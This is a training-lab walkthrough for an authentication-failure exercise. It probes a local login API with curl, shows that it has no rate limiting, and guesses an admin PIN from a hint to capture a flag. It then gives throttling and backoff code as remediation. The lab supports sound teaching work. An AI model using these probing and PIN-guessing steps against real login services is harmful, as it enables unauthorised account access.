# Practice Walkthrough: Authentication Failures & Automated PIN Brute-Forcing

This walkthrough adheres to the 4-Tier Mission Progression methodology, balancing **60% manual analytical inspection** and **40% terminal command execution**:

---

## Tier 1: Attack Surface Observation (Weight: 15% — Manual)

1. **Verify Target Service Readiness**:
   Open your web browser and navigate to the lab target:
   `http://127.0.0.1:8017`

2. **Inspect the OmniAuth Login Interface**:
   - Examine the title: `OmniAuth // Admin Gateway` (OWASP A07:2025).
   - Review the security audit banner:
     *Notice the absence of rate-limiting, CAPTCHA, or account lockout.*
   - Inspect the form input fields:
     - **Administrative Username**: Pre-populated with `admin`.
     - **Security PIN / Password**: Requests a 4-digit numeric PIN representing the release year of the lab suite.
   - Open browser Developer Tools (press **F12** or `Ctrl + Shift + I`) and switch to the **Network** tab to prepare for request monitoring.

---

## Tier 2: Endpoint Discovery & Error Probing (Weight: 25% — Manual & Probing)

1. **Probe Health Status**:
   Verify service availability via browser or terminal:
   ```bash
   curl -s http://127.0.0.1:8017/health
   ```
   *Expected response*: `{"lab":"A07","port":8017,"status":"ok"}`

2. **Probe Failed Authentication Behavior**:
   Issue an invalid authentication request using cURL to measure response latency and inspect response headers:
   ```bash
   curl -i -X POST http://127.0.0.1:8017/api/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "0000"}'
   ```

3. **Analyze Header & Latency Findings**:
   - Status code: `HTTP/1.1 401 UNAUTHORIZED`.
   - Execution duration: Sub-10 milliseconds.
   - **Absence of Rate-Limiting Headers**: No `Retry-After` header is supplied, no CSRF token is required, and no failed-attempt counter is enforced.
   - Repeat the command rapidly 5 times: the server accepts each submission immediately without triggering cooldowns or IP blacklists. This proves unthrottled brute-force feasibility.

---

## Tier 3: Controlled Exploitation & Flag Capture (Weight: 35% — Tools: cURL)

1. **Keyspace Reduction via Context**:
   System hints note that the administrator's PIN corresponds to the active release year of this laboratory suite (within the 2020 through 2030 decade).

2. **Execute Targeted PIN Evaluation**:
   Test candidates around the current era (e.g. 2024, 2025, 2026) using cURL:
   ```bash
   # Test candidate PIN 2026
   curl -s -X POST http://127.0.0.1:8017/api/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "2026"}'
   ```

3. **Verify Authentication & Extract Challenge Flag**:
   The API responds with an affirmative authentication payload:
   ```json
   {
     "status": "passed",
     "message": "Authentication successful!",
     "flag": "ZITERA{...}"
   }
   ```

4. **Verify via Web Interface**:
   Return to your browser at `http://127.0.0.1:8017/login`:
   - Input username: `admin`.
   - Input PIN: `2026`.
   - Click **Authenticate**: Session state transitions to authenticated and redirects to `/admin`, exposing the master challenge flag within the green banner.
   - Copy the recovered flag token from the screen and submit it in the **Challenge** tab.

---

## Tier 4: Defensive Verification & Remediation Hardening (Weight: 25% — Manual & Tools)

1. **Implement Server-Side Rate Limiting**:
   Incorporate request throttling within the login controller:
   ```python
   # Secure Implementation: Stateful Throttling
   import time

   FAILED_ATTEMPTS = {}

   def check_rate_limit(client_ip):
       attempts, last_seen = FAILED_ATTEMPTS.get(client_ip, (0, 0))
       if attempts >= 5 and time.time() - last_seen < 300: # 5-minute lockout
           return False
       return True
   ```

2. **Apply Exponential Backoff**:
   Introduce progressive sleep delays (`time.sleep(2 ** attempts)`) on sequential failed attempts to neutralize automated dictionary scripts.

3. **Confirm Enforcement**:
   Upon the 6th failed attempt, the server halts evaluation and returns HTTP **`429 Too Many Requests`** along with a mandatory `Retry-After: 300` header.
